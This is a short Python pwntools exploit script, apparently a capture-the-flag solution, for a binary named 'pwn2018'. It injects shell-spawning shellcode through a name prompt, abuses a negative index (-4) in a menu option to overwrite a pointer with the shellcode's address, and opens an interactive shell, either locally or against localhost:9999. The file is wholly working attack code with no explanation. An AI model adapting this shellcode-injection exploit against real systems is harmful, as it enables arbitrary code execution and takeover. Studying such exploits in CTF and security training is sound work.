#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
context.arch = 'i386'
context.os = 'linux'

elf = ELF("./pwn2018")
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process("./pwn2018")
    libc = elf.libc


else:
    io = remote("localhost", 9999)
    #  libc = ELF("")


def DEBUG():
    raw_input("DEBUG: ")
    gdb.attach(io)

if __name__ == "__main__":
    sc = asm(shellcraft.sh())
    io.sendlineafter(":\n", sc)
    io.sendlineafter("Choose ", "2")
    io.sendlineafter(": ", "-4")
    #  DEBUG()
    io.sendafter(': ', p32(elf.sym['userName']) + '00')

    io.interactive()
    io.close()



